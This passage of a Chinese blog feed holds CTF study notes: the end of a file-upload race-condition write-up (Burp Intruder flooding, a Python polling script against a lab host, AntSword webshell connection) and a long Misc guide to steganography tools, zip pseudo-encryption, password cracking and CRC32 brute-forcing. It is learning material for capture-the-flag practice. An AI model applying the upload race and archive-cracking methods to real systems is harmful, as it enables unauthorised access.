17（条件竞争）</h2><p>这题理解了很久，以下是源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f6223d6ee82.jpg"></p><p>结合网上和自己的审计，大概理解如下：</p><p>可以看到有一个unlink函数，是一个删除函数，意思是当我们进行文件上传时，会先将文件传至服务器，判断我们的文件合不合法，如果不合法则删除它，但是这中间可以有一个时间差，如果我们上传的比服务器删的快，那么我们就可以达到代码执行的目的</p><p>所以我们只要抓包后将php代码一直执行，一直发包，然后用脚本来判断是否成功，成功则用蚁剑连接</p><p>如下图，我们进行抓包，然后右键爆破</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/fab630887e071a63.png"></p><p>选择我们需要爆破的东西，这里当然是这句php语句了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/7ef1dfcfd0e0fe68.png"></p><p>这里我们选择，一直发包的设置</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/5f0b091d2a7da2bf.png"></p><p>然后准备python脚本，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b5df420-7c50-4c2c-ad93-117aa129ac4c.node4.buuoj.cn/upload/11.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:/检测回响值为<span class="number">200</span>的，也就是上传成功的页面</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在burp里开始攻击，同时python也同时运行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/bf65c7989c76e208.png"></p><p>如下图显示成功了：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/f41a1b486ab2635c.png"></p><p>然后我们用蚁剑进行连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/f859b0d553933839.png"></p><p>连接成功，拿到权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/902ad28f9a31638c.png"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;h1 align = &quot;center&quot;&gt;文件上传学习笔记&lt;/h1&gt;



&lt;h2 id=&quot;文件上传常用函数&quot;&gt;&lt;a href=&quot;#文件上传常用函数&quot; class=&quot;headerlink&quot; title=&quot;文件上传常用函数&quot;&gt;&lt;/a&gt;文件上传常用函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    <category term="-Web" scheme="https://blog.abinix.top/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>Misc学习笔记</title>
    <link href="https://blog.abinix.top/2021/07/17/Misc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.abinix.top/2021/07/17/Misc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-17T13:11:34.000Z</published>
    <updated>2021-09-13T02:20:58.997Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Misc学习笔记</h1><h2 id="😺图片隐写"><a href="#😺图片隐写" class="headerlink" title="😺图片隐写"></a>😺图片隐写</h2><ul><li><h3 id="🎈Exif信息隐藏"><a href="#🎈Exif信息隐藏" class="headerlink" title="🎈Exif信息隐藏"></a>🎈Exif信息隐藏</h3><ul><li><h4 id="Exif是什么？"><a href="#Exif是什么？" class="headerlink" title="Exif是什么？"></a>Exif是什么？</h4><blockquote><p>​        Exif就是用来记录拍摄图像时的各种信息：图像信息（厂商，分辨率等），相机拍摄记（ISO，白平衡，饱和度，锐度等），缩略图（缩略图宽度，高度等），gps（拍摄时的经度，纬度，高度）等，将这些信息按照JPEG文件标准放在图像文件头部。</p></blockquote></li></ul></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac229d5c2.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac22bfffe.jpg"></td></tr></table><p>​            如上图上述的信息都可以隐藏信息，我们可以通过<strong>右键属性</strong>，<strong>查看详细信息</strong>，也可以通过<a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a> 在线exif中查看</p><ul><li><h3 id="🎈图片修复式隐写"><a href="#🎈图片修复式隐写" class="headerlink" title="🎈图片修复式隐写"></a>🎈图片修复式隐写</h3><ul><li><p>此隐写可分为<strong>图片头修复</strong>、<strong>图片尾修复</strong>、<strong>长宽高修复</strong></p></li><li><h4 id="文件头文件尾总结"><a href="#文件头文件尾总结" class="headerlink" title="文件头文件尾总结"></a>文件头文件尾总结</h4><blockquote><p>JPEG (jpg)，            文件头:FFD8FF　　文件尾: FFD9　　　　　　　　　　　　　　　<br>PNG (png)，           文件头:89504E470D0A1A0A　文件尾:AE 42 60 82<br>GIF (gif)，               文件头:47494638　文件尾:00 3B             </p><p>ZIP Archive (zip)， 文件头:504B0304　文件尾：50 4B</p><p>TIFF (tif)，               文件头:49492A00　<br>Windows Bitmap (bmp)，      文件头：424D<br>CAD (dwg)，           文件头：41433130<br>Adobe Photoshop (psd)，      文件头：38425053　<br>Rich Text Format (rtf)，           文件头：7B5C727466　<br>XML (xml)，                             文件头：3C3F786D6C　<br>HTML (html)，                          文件头：68746D6C3E<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，           文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS Access (mdb)，                   文件头：5374616E64617264204A<br>WordPerfect (wpd)，                 文件头：FF575043<br>Adobe Acrobat (pdf)，              文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，      文件头：E3828596</p><p>RAR Archive (rar)，                   文件头：52617221<br>Wave (wav)，                           文件头：57415645<br>AVI (avi)，                                 文件头：41564920<br>Real Audio (ram)，                   文件头：2E7261FD<br>Real Media (rm)，                    文件头：2E524D46<br>MPEG (mpg)，                        文件头：000001BA<br>MPEG (mpg)，                        文件头：000001B3<br>Quicktime (mov)，                  文件头：6D6F6F76<br>Windows Media (asf)，           文件头：3026B2758E66CF11<br>MIDI (mid)，                            文件头：4D546864</p></blockquote></li><li><h4 id="图片头尾修复"><a href="#图片头尾修复" class="headerlink" title="图片头尾修复"></a>图片头尾修复</h4><p>在一些ctf题目中，出题人会把图片的<strong>文件头或是文件尾去掉</strong>，这时我们就要<strong>手动添加</strong>文件头，尾。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7edad6ecec.jpg"></p><p>如图，我们加上文件头后即可查看图片</p></li><li><h4 id="长宽高修复"><a href="#长宽高修复" class="headerlink" title="长宽高修复"></a>长宽高修复</h4><p>一般会有一些信息隐藏在图片的下面，但由于图片<strong>高度限定</strong>，导致我们看不见，这时我们便可以通过<strong>更改宽高</strong>的方法进行修复。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0f3a417.jpg"></p><p>如上图我们更改图片的高度</p><p>在 unit32 height 中修改高度，改的高一点即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0a06d5d.jpg"></p><p>于是flag就出来了</p></li></ul></li><li><h3 id="🎈隐藏信息到十六进制区域"><a href="#🎈隐藏信息到十六进制区域" class="headerlink" title="🎈隐藏信息到十六进制区域"></a>🎈隐藏信息到十六进制区域</h3><ul><li><p>因为在<strong>文件尾添加一串编码</strong>并不会影响显示，所以一些赛题会采用这样的方式隐藏</p></li><li><p>或者会把flag藏到文本里，这时我们 <strong>ctrl+f</strong> 进行搜索即可。</p></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e82b2a8383f.jpg"></td><table></li><li><p>如上图，我们用010打开后发现文件尾有一串编码，分析后得知该编码为<strong>Unicode</strong></p><p>我们用在线网站 <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a> </p><p>即可得到flag</p></li><li><h3 id="🎈LSB隐写"><a href="#🎈LSB隐写" class="headerlink" title="🎈LSB隐写"></a>🎈LSB隐写</h3><ul><li><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p>LSB全称为 least significant bit，是最低有效位的意思。Lsb图片隐写是基于lsb算法的一种图片隐写术。机器并不是通过像素识别，而是通过该像素点的数值大小识别，所以在人类眼中一样的，在机器那不一样。一个像素点占8位，每位有3个颜色，每个像素点能隐藏3个信息。</p><p>所以低有效位的数据改变在人眼看来是一样的，<strong>所以在最后一位隐藏数据是一个有效的方法。</strong></p></blockquote></li><li><p>对于lsb隐写 我们用<strong>Stegsolve.jar</strong>工具查看即可</p><p>打开点击Stegsolve.jar工具 点击 Analyse 再点击 Data Extract</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f1b2f1f11.jpg"></p><p>因为是LSB，<strong>利用最低有效位</strong>，所以我们将<strong>RGB的色素</strong>都调为0 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f274792a6.jpg"></p><p>即可得到一些信息</p></li></ul></li><li><h3 id="🎈Jphide隐写"><a href="#🎈Jphide隐写" class="headerlink" title="🎈Jphide隐写"></a>🎈Jphide隐写</h3><ul><li><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Jphide是基于最低有效位LSB的<strong>JPEG</strong>格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</p></blockquote></li><li><p>我们采用<strong>JPHS</strong>软件解密（用于对 JPEG 文件进行 Jhide 算法的隐写或提取）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f909852ff.jpg"></p><p>点击hide 输入对应密码即可解密。（有些也可不输）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9292791efb.jpg"></p><p>输入完毕则会在桌面上创建一个文件。内容则是隐藏的信息</p></li></ul></li><li><h3 id="🎈outguess隐写"><a href="#🎈outguess隐写" class="headerlink" title="🎈outguess隐写"></a>🎈outguess隐写</h3><ul><li><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Outgusee算法是Niels Provos针对Jsteg算法的缺陷提出的一种方法：</p><p>对应的，也有针对该算法的隐写工具，名字也叫Outguess。</p></blockquote></li><li><h4 id="安装outguess"><a href="#安装outguess" class="headerlink" title="安装outguess"></a>安装outguess</h4><ol><li><p>Kail终端命令输入<code>git clone https://github.com/crorvick/outguess</code></p></li><li><p>下载完毕进入outguess文件夹中</p></li><li><p>在终端中输入<code>./configure &amp;&amp; make &amp;&amp; make install</code> 即可安装</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e963ed73b0a.jpg"></p></li></ol><p>如上图已经安装完毕，输入<strong>outguess</strong>可查看指令</p><ul><li><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p><code>outguess -r “图片位置” -t 11.txt</code></p><p>其中 r 为解密指令</p><p>11.txt 为导出的文件</p><p>如下图为成功结果</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c9adf0b5d.jpg"></p></li></ul></li><li><h3 id="🎈F5隐写"><a href="#🎈F5隐写" class="headerlink" title="🎈F5隐写"></a>🎈F5隐写</h3><blockquote><p>F5隐写全称F5-steganography，</p><p>在kail系统命令端输入以下代码来下载：</p><p><code>git clone https://github.com/matthewgao/F5-steganography</code></p></blockquote></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96bb308de3.jpg"></p><p>​        如图：可以看到左边生成了一个名为F5的文件包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96f66dd6b0.jpg"></p><p>​        结果一看 使用不了，<strong>需要java环境</strong>，那好吧 整一个。</p><ul><li><h4 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h4><ul><li><p>去java官网下载jdk，然后粘贴到虚拟机中  <a href="https://www.oracle.com/java/technologies/javase-jdk16-downloads.html">https://www.oracle.com/java/technologies/javase-jdk16-downloads.html</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b2e04e267.jpg"></p></li><li><p><strong>因为kali自带的java版本是Openjdk，因此需要卸载，在终端中输入命令</strong><code>apt-get remove openjdk*</code></p></li><li><p>将不再需要的<strong>java软件卸载</strong>，输入命令：<code>apt autoremove</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b4366e8cb.jpg"></p></li></ul><ul><li><p>然后<strong>解压缩并移动至/opt文件夹</strong></p><blockquote><p><code>cp jdk-16.0.1_linux-x64_bin.tar.gz /opt</code>将压缩包移动至/opt文件夹</p><p><code>tar -xvzf jdk-16.0.1_linux-x64_bin.tar.gz</code>将压缩包解压至当前文件夹</p><p><code>cd jdk-16.0.1</code>进入解压好的文件夹</p></blockquote></li><li><p><strong>设置环境变量</strong>  <code>vi  /etc/profile</code> </p><p>并在尾部加入如下信息</p><blockquote><p>#install JAVA JDK</p><p>export JAVA_HOME=/opt/jdk-16.0.1</p><p>export CLASSPATH=.:${JAVA_HOME}/lib</p><p>export PATH=${JAVA_HOME}/bin:$PATH </p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bbf1c1ec9.jpg"></p></li><li><p>接下来<strong>安装并注册</strong> 依次输入下列命令</p><blockquote><p>update-alternatives –install /usr/bin/java java /opt/jdk-16.0.1/bin/java 1<br>update-alternatives –install /usr/bin/javac javac /opt/jdk-16.0.1/bin/javac 1<br>update-alternatives –set java /opt/jdk-16.0.1/bin/java<br>update-alternatives –set javac /opt/jdk-16.0.1/bin/javac</p></blockquote></li><li><p>完毕后，输入<code> java -version</code>查看是否安装完毕，如果出现以下结果则表示安装完毕</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bba29d530.jpg"></p></li></ul></li><li><h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><ol><li><p>cd到安装目录下</p></li><li><p>输入<code>java Extract “待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c44f0b4e4.jpg"></p><p>还是出现了错误 </p><h5 id="心态炸了🧨"><a href="#心态炸了🧨" class="headerlink" title="心态炸了🧨"></a>心态炸了🧨</h5><p>网上一查发现是因为我<strong>jdk版本太高而在较低版本的文件下运行造成的</strong> </p><h5 id="靠🧨"><a href="#靠🧨" class="headerlink" title="靠🧨"></a>靠🧨</h5><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c49fc3b20.jpg"></p><p>行吧，那我在<strong>windows</strong>里下，windows里jdk版本<strong>低</strong>，好趴</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c50679296.jpg"></p><p>输入<code>java Extract “待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c58820773.jpg"></p><h5 id="终于完成了-我的天"><a href="#终于完成了-我的天" class="headerlink" title="终于完成了 我的天"></a>终于完成了 我的天</h5><h5 id="解密结果会在当前文件夹的-output-txt-中"><a href="#解密结果会在当前文件夹的-output-txt-中" class="headerlink" title="解密结果会在当前文件夹的 output.txt 中"></a>解密结果会在当前文件夹的 output.txt 中</h5><p>结束 F5 </p></li></ol></li><li><h3 id="🎈盲水印隐写"><a href="#🎈盲水印隐写" class="headerlink" title="🎈盲水印隐写"></a>🎈盲水印隐写</h3><ul><li><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><blockquote><p>隐藏式的水印是以数字数据的方式加入音频、图片或影片中,但在一般的状况下无法被看见。</p><p>当有两张图片一模一样时，多半是盲水印加密过的</p></blockquote><p>这里我们用到 <strong>blind-watermark</strong>工具解密</p></li><li><h4 id="安装cv2库"><a href="#安装cv2库" class="headerlink" title="安装cv2库"></a>安装cv2库</h4><p>**这个工具需要安装 cv2 的库 **</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9ce7115fa2.jpg"></p><p>​    使用命令安装<code>pip install opencv-python</code></p><p><strong>在安装这个库的时候试错了无数次，一直显示没有模板cv2，在网上也查找了许多资料，但都无法解决，无奈之下只能在windows环境下部署</strong></p><p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a> 安装盲水印工具，</p><p>并放入python <strong>site-packages</strong>文件下</p><ul><li><h4 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h4><p>这一部分<strong>也试错了许多，</strong>因为我是在python3环境下解密的，所以在使用常用的命令解密时，会出现下图的情况</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebc8413d38b.jpg"></p><p>查找大量资料才知道，<strong>主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 <code>--oldseed</code>参数。</strong></p><p>以下为<strong>python3</strong>解密：</p><p>首先cd到盲水印工具安装目录下，然后输入</p><p><code>python bwmforpy3.py decode 0.png 1.png flag.png --oldseed</code></p><p>0.png 和 1.png为两张相同的图片</p><p>flag.png为解密后的结果</p></li></ul><p>​        运行脚本后提取查看解密结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebca13c78c7.jpg"></p></li></ul><h2 id="😺压缩包破解"><a href="#😺压缩包破解" class="headerlink" title="😺压缩包破解"></a>😺压缩包破解</h2><ul><li><h3 id="🎈伪加密"><a href="#🎈伪加密" class="headerlink" title="🎈伪加密"></a>🎈伪加密</h3><ul><li><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4></li></ul></li></ul><blockquote><p>zip伪加密是在<strong>文件头的加密标志位做修改</strong>，进而再打开文件时识被别为加密压缩包。</p><p><strong>一个 ZIP 文件由三个部分组成：</strong></p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p></blockquote><p>而伪加密就是在<strong>压缩源文件目录区</strong>中进行修改数据达到伪加密的效果。</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 01 00 或 09 00 改为 00 00  就可以<strong>去除</strong>密码</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 00 00 改为  01 00 或 09 00  就可以<em><strong>添加</strong></em>密码 </p><p>经验告诉我一般是在<strong>倒数第二个</strong>的文件头中更改。找到文件头第九第十个字符，将其修改为0000<strong>即可解密</strong></p><h5 id="🤦‍♂️举个栗子吧"><a href="#🤦‍♂️举个栗子吧" class="headerlink" title="🤦‍♂️举个栗子吧"></a>🤦‍♂️举个栗子吧</h5><p>我们用010打开压缩包</p><p>然后用ctrl+f进行寻找文件头为 504B0102的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd0be4227c.jpg"></p><p>然后我们将第九个字符改为09</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd073f1a4d.jpg"></p><p>如下图可发现 压缩包已经上锁了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd1a199874.jpg"></p><p>如果要打开，也是同样的道理，将09改为00即可</p><ul><li><h3 id="🎈字典爆破（暴力）"><a href="#🎈字典爆破（暴力）" class="headerlink" title="🎈字典爆破（暴力）"></a>🎈字典爆破（暴力）</h3><blockquote><p>暴力破解就是选择密码范围,长度等,由软件组合生成密码进行爆破</p></blockquote></li></ul><p>这里我们用到windows下的软件 advanced zip password recovery</p><p>我们将软件打开后，选择统计类型为<strong>暴力</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5577adb81.jpg"></p><p>设置完毕后点击开始，即开始爆破</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed559ea345c.jpg"></p><p>如图，暴力破解已找到答案</p><ul><li><h3 id="🎈明文攻击"><a href="#🎈明文攻击" class="headerlink" title="🎈明文攻击"></a>🎈明文攻击</h3><p>明文攻击真的学到了超级多知识</p><ul><li><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><blockquote><p>所谓明文攻击就是已经通过其他手段知道zip加密文件中的某些内容，比如在某些网站上发现它的readme.txt文件，或者其他文件，这时就可以尝试破解了</p></blockquote></li><li><h4 id="前提！！"><a href="#前提！！" class="headerlink" title="前提！！"></a>前提！！</h4><p><strong>明文文件要和加密文件的格式相同，所以这里需要压缩–这里一定要注意我们的压缩方式要相同</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3e3920ff9.jpg"></p></li></ul></li></ul><h4 id="👱‍♂️举个例子"><a href="#👱‍♂️举个例子" class="headerlink" title="👱‍♂️举个例子"></a>👱‍♂️举个例子</h4><p>​        如图 下面是一个压缩包 但是我们可以发现，里面还有一个11.zip，并且内容也是加密的，但是我们已知一张图片，可以看到这张图片的<strong>CRC值和压缩包里面的图片CRC值一样</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed02234d6dc.jpg"></p><p>​        接下来我们放入 ARCHPR 中进行明文攻击，如下图，注意几个框框</p><p>​        <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3f3f5b092.jpg"></p><p>注意：虽然显示一直在爆破，但我们只要<strong>中断爆破</strong>，然后就会弹出一个压缩包，这时已经解密成功了。</p><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4058ccd2d.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40699ce45.jpg"></td></tr></table><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40979661f.jpg"></p><ul><li><h3 id="🎈掩码攻击"><a href="#🎈掩码攻击" class="headerlink" title="🎈掩码攻击"></a>🎈掩码攻击</h3><p>我的理解：  当我们记得密码的部分，或者几个字符或者长度时，这时我们可以用掩码攻击来爆破，穷举。</p><p>这里我们还是用到  ARCHPR  软件</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4a51ed8c5.jpg"></p><p>​    如图 从注释中我们得知 password 为：jhc????!@#$</p><p>​    <strong>很显然掩码攻击，如下图，注意框框中的信息。</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4af5a36e1.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4b620eddc.jpg"></p><p>​        解密结果已经出来</p><ul><li><h3 id="🎈CRC32碰撞"><a href="#🎈CRC32碰撞" class="headerlink" title="🎈CRC32碰撞"></a>🎈CRC32碰撞</h3><ul><li><h5 id="4位字节CRC32碰撞"><a href="#4位字节CRC32碰撞" class="headerlink" title="4位字节CRC32碰撞"></a>4位字节CRC32碰撞</h5><p>简单地说就是在一个压缩包中，有<strong>两个加密文件字节</strong>是一样的，而文件的内容只有相同的时候，他的crc校验才会一样，这时我们可以通过获取他的crc32值来与我们的内容<strong>计算得到的值</strong>进行相互比较。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4e1bd25fe.jpg"></p></li></ul><p>​        上脚本！！ 此脚本具有<strong>多线程</strong></p><p>​        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _<span class="built_in">input</span> = _crc</span><br><span class="line">    _<span class="built_in">input</span> = <span class="string">&quot;0X&quot;</span> + _<span class="built_in">input</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hex</span>(binascii.crc32(s)).upper() == _<span class="built_in">input</span>.upper():</span><br><span class="line">                        <span class="built_in">print</span>(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        <span class="built_in">print</span>(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure><p>结果如下，Asr3 和 Tp01 则分别是两个txt文件的内容，拼起来即是压缩包密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5149c3eef.jpg"></p><ul><li><h5 id="6位字节CRC32碰撞"><a href="#6位字节CRC32碰撞" class="headerlink" title="6位字节CRC32碰撞"></a>6位字节CRC32碰撞</h5></li></ul><p>相比于4字节，6字节会更难爆破一些，我在github上找了个工具</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed52a367df5.jpg"></p><p>在windows命令行中进入crc32文件夹中</p><p><strong>输入命令 <code>python crc32.py reverse 0x（为文件CRC32值）</code></strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed53252397f.jpg"></p><p>如图我们已经将txt密码穷举出来了，这代表碰撞成功，接下来就是进行密码穷举，然后爆破，这里不多赘述了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Misc学习笔记&lt;/h1&gt;

&lt;h2 id=&quot;😺图片隐写&quot;&gt;&lt;a href=&quot;#😺图片隐写&quot; class=&quot;headerlink&quot; title=&quot;😺图片隐写&quot;&gt;&lt;/a&gt;😺图片隐写&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;🎈Ex</summary>
      
    
    
    
